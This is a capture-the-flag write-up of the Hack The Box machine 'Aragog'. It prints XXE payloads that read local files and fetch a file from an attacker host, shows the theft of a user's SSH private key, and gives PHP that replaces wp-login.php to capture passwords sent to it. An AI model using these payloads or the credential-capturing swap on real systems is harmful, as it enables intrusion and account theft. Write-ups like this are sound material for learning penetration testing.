# Aragog [HTB](https://app.hackthebox.com/machines/126)
![aragog-01]()

## Recon 

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 aragog.htb
```

![ports-02]()

Now we can perfrom an extensive query of these services with:

```bash
nmap -p 21,22,80 -sCV aragog.htb -oN nmap.result
```

![namp-res-03]()

We have the following:

+ An vsFTPd 3.0.3 server on port 21.
+ An OpenSSH server on port 22.
+ An Apache v2.4.18 server on port 80.


It appears that the FTP server is allowing anonymous logins, and `nmap` has found a text file of `test.txt`. The Apache web server is appeard to be serving a default page. Let's start with the FTP server, and see what we can gather, after that we'll take a look at that Apache server. 


## FTP port 21

Let's log in anonymously with `anonymous : anything` and get the text file:

![ftp-04]()

Now we can read the file:

![test-05]()

This looks like a possible XML file because the tag names are custom, meanining they are XML entitie, not HTML tags. A subnet of /26 being is saved as the data. At the moment I'm not really sure what this subnet represents or how it comes into play here. I tried running `binwalk` and `exiftool` againts this file to see if maybe there is hidden content but there isn't. 

Let's move on to the Apache server. 


## Apache Port 80

If we open the site at `http://aragog.htb` we can see the default Apache page:

![site-06]()

Not much to do or see here, let's run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://aragog.htb/FUZZ -e .php,.cgi,.js,.txt,.xml,.conf,.html
```

Which revealed the following file:

![hosts-07]()

If we open this file in our browser we get the following:

![result-08]()

Could this be referencing the number of hosts per subnet? Let's take a look at our request and response in Burp:

![burp-09]()

Looks rather simple, doesnt seem like we are uploading anything to the server, how does it come up with this answer then? can we try to upload something? Lets try the file we downloaded from the FTP, it had a subnet inside it.

![upload-10]()

We can see the file upload was sucssesful, the file we found from the FTP is what this php script is looking for. It waits for XML files with an `<subnet_mask>` entity to prase and calculate the number of hosts per the subnet value.

I'm thinking [XXE](https://portswigger.net/web-security/xxe), `HackTricks` has a nice [cheat-sheet overview](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) with different payloads to try.

At first I tried the following payload:

```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<details>
    <subnet_mask>&example;</subnet_mask>
    <test>&example;</test>
</details>
```

![success-11]()

This gives us `/etc/passwd`. Next I tried to execute a command using the following payload:

```xml
<!DOCTYPE root [<!ENTITY foo SYSTEM "expect://id">]>
<details>
    <subnet_mask>&foo;</subnet_mask>
    <test>
</test>
</details>
```
  
This didnt work. Probably because the PHP `expect` module isn't loaded on the target. So instead, I decdied to try and send the target to fetch a remote file from my Kali machine. 

I created a simple text file with `echo "pwned" > myfile.txt` and hosted it via a python server with `python3 -m http.server 80`. Then I used the following payload the fetch the file:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.10.14.43/myfile.txt"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test>
</test>
</details>
```

![fetch-12]()

We can see that not only the target fetched the file, it opend it , and used it's contents to render the response. So I decided to retrive the source code for the `hosts.php` file to see how we can break it's logic. I used the following payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/hosts.php"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test>
</test>
</details>
```

This returns the file in base64, after decoding it it looks like this:

![source-13]()

I tired to break out of the `echo` statement with payloads like `" . system('ls') //`, etc, but nothing worked. It appears that we can only read files form the target, this could be enough though, since we know SSH is anbled on this server, maybe we can find SSH keys? 

Based on the content of `/etc/passwd` we know that we have two valid user accounts on the target:

![users-14]()

We have `florian` and `cliff`, let's dig inside their home folders and see if we can fetch something.
Let's start with the first user account `florian`. The private SSH key is usually stored at `~/.ssh/id_rsa`:

![key-15]()

Looks good, I highlighted the key and saved it to a file locally. I tried to get `cliff`'s private key as well but that didnt work. 
 
Let's try to log in with the private key. To do that we need to make sure the key has proper permissions:

```bash
chmod 600 florian_key
``` 

Otherwise we will get an error. Then we can connect using:

```bash
ssh -i florian_key florian@aragog.htb
```

![shell-16]()


## Privilege Escalation

After having a look around our user's home directory I decided to run [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). I hosted the file via a python web server and transferred it over to the target using `wget`.

Running it brought some interesting results:

![linpeas-17]()

Looks like we have `WordPress` on the Apache server, this directory didnt came up in my directory scan.
I know from `HackTricks`'s [page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) that `WordPress` has a sensetive file at `wp-config.php` which may disclose credentials to the `WordPress` database.

If we `cat` this file:

![db-18]()

We see the creds. We can try to log in with the following syntax:

```bash
mysql -uroot -p
Enter password: <paste pass>
```

![welcome-19]()

the `wp_wiki` is the database we want. 

```sql
select wp_wiki;
show TABELS;
```

![tables-20]

The `wp_users` looks juicy. Let's retrieve everything form this table:

```sql
select * from wp_users;
```

![users-21]()


We get the admin's password hash. Lets's [idenetify the hash](https://hashes.com/en/tools/hash_identifier):

![hash-22]()

This gives a potential for a few different hash types. I found that the hash fits the format of the `phpass` hashing algorithm. I tried to crack it with `hashcat` using:

```bash
hashcat -m 400 -a 0 "$P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu." rockyou.txt 
```

Unfortunately this didnt work, I tried several different wordlists but no luck. 

At this point I got rather stuck, I wasnt sure exactly how to proceed, I started hunting down for stored credentials, I found keyring files in `florian` home folder and cracked them, but they didnt lead anywhere. I went over the files in `dev_wiki` several times, reading articals on how to exploit WordPress servers but I found nothing useful. 

At some point I decided to list out the running processes on the system with `ps auxww` :

![ps-auxww-23]()

Looks like `cliff` is running `wp-login.py` via a task. I wasnt sure what this script does, but we dont have permissions to view it's contents. So I decided to search online, and I manged to find the [source code](https://gist.github.com/GreeeenApple/5a322bb44eae37ec9727):

![source-24]()

Looks like its automating the login process to the WordPress admin panel. We can see some credentials are stored in a dictionary, and used to login, but none of them matches the username we saw in the database, so I presume `cliff` edited this file with the correct credentials. The path to the login script is also different on our target. We dont have `wp-admin/wp-login.php`, we have `wp-login.php`. 

We can see that the login request is a `POST` request with the parameters: `log` for the username, and `pwd` for the password. 

If we can edit the `wp-login.php` file, we might be able to capture the login creds when `cliff` makes a request. Let's see if we can edit the file:

![perms-25]()

Yes we can, Let's try to catch the creds. At first I came up with something like this:


```php
<?php

$data = get_file_contents('php://input');

$path = fopen('/tmp/data.txt', 'w');
fwrite($path, $data);
fclose($path);

?>
```

I deleted the original `wp-login.php` and replaced it with the above code. The reason I picked `get_file_contents` to parse the content's of the POST request is because the `Content-Type` header for the login reqeust was `application/x-www-form-urlencoded`, so using `$_POST` won't work. This code created the `/tmp/data.txt` file, but it was empty. 

So instead, I decided to capture the entire POST request as is using `$_REQUEST` with the following code:

```php
<?php

$request = print_r($_REQUEST, true);
$path = fopen("/tmp/data.txt", "w");
fwrite($path, $request);
fclose($path);

?>
```

This worked, and data was written to the file:

![partial-26]()

The password was missing. I wasn't sure what's the issue. After a while I tried to change the file mode to append to the file, instead of overwriting it. I used `$path = fopen('/tmp/data.txt', "a")`

This worked to retrive the password:

![pass-27]()

So I guess that the login process is sent in two parts? Lets try to switch user to `cliff`:

![failed-28]()

That's weird, I was sure the password will be reused by `cliff`. It wasn't, instead, It's used by root:

![root-29]()
